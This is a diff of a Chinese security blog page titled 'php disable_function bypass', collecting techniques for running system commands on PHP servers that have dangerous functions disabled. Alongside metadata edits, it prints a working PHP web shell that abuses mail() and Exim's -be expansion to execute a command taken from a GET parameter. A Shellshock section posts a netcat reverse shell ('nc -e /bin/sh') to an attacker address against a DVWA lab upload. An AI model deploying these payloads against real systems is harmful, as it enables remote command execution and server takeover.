@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="1https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/bypass_function.md Exim_mail_bypass_disable_functionhttp://www.cnblogs.com/iamstudy/articles/Exim_mail_bypass_disable_function.html">
+<meta name="description" content="php disable_function bypass">
 <meta name="keywords" content="php">
 <meta property="og:type" content="article">
 <meta property="og:title" content="php disable_function bypass">
 <meta property="og:url" content="http://yoursite.com/2018/03/01/php-disable-function-bypass/index.html">
 <meta property="og:site_name" content="tarn4">
-<meta property="og:description" content="1https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/bypass_function.md Exim_mail_bypass_disable_functionhttp://www.cnblogs.com/iamstudy/articles/Exim_mail_bypass_disable_function.html">
+<meta property="og:description" content="php disable_function bypass">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-03-01T06:34:08.693Z">
+<meta property="og:updated_time" content="2018-03-21T16:24:32.597Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="php disable_function bypass">
-<meta name="twitter:description" content="1https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/bypass_function.md Exim_mail_bypass_disable_functionhttp://www.cnblogs.com/iamstudy/articles/Exim_mail_bypass_disable_function.html">
+<meta name="twitter:description" content="php disable_function bypass">
 
 
 
@@ -300,7 +300,9 @@
       
 
       
-        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/bypass_function.md</span><br></pre></td></tr></table></figure>
+        <p>php disable_function bypass</p>
+<a id="more"></a>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/bypass_function.md</span><br></pre></td></tr></table></figure>
 <h2 id="Exim-mail-bypass-disable-function"><a href="#Exim-mail-bypass-disable-function" class="headerlink" title="Exim_mail_bypass_disable_function"></a>Exim_mail_bypass_disable_function</h2><p><a href="http://www.cnblogs.com/iamstudy/articles/Exim_mail_bypass_disable_function.html" target="_blank" rel="noopener">http://www.cnblogs.com/iamstudy/articles/Exim_mail_bypass_disable_function.html</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">函数:mail,file_put_contents,file_get_contents</span><br></pre></td></tr></table></figure></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$c = @$_GET[&apos;lemon&apos;];</span><br><span class="line">$result_file = &quot;/tmp/test.txt&quot;;</span><br><span class="line">$tmp_file = &apos;/tmp/aaaaaaaaaaa.sh&apos;;</span><br><span class="line">$command = $c . &apos;&gt;&apos; . $result_file;</span><br><span class="line">file_put_contents($tmp_file, $command);</span><br><span class="line">$payload = &quot;-be \$&#123;run&#123;/bin/bash\$&#123;substr&#123;10&#125;&#123;1&#125;&#123;\$tod_log&#125;&#125;/tmp/aaaaaaaaaaa.sh&#125;&#123;ok&#125;&#123;error&#125;&#125;&quot;;</span><br><span class="line">mail(&quot;a@localhost&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;, $payload);</span><br><span class="line">echo file_get_contents($result_file);</span><br><span class="line">@unlink($tmp_file);</span><br><span class="line">@unlink($result_file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 <h2 id="Bash-破壳漏洞-CVE-2014-6271"><a href="#Bash-破壳漏洞-CVE-2014-6271" class="headerlink" title="Bash 破壳漏洞 CVE-2014-6271"></a>Bash 破壳漏洞 CVE-2014-6271</h2><p><a href="http://www.cnblogs.com/iamstudy/articles/CVE-2014-6271_shellshock.html" target="_blank" rel="noopener">http://www.cnblogs.com/iamstudy/articles/CVE-2014-6271_shellshock.html</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php脚本绕过函数禁用，实现系统命令执行</span><br><span class="line">http://192.168.101.128/dvwa/hackable/uploads/a.php</span><br><span class="line">post：</span><br><span class="line">cmd=/bin/bash -c &apos;nc -e /bin/sh 192.168.101.129 12666&apos;</span><br></pre></td></tr></table></figure></p>
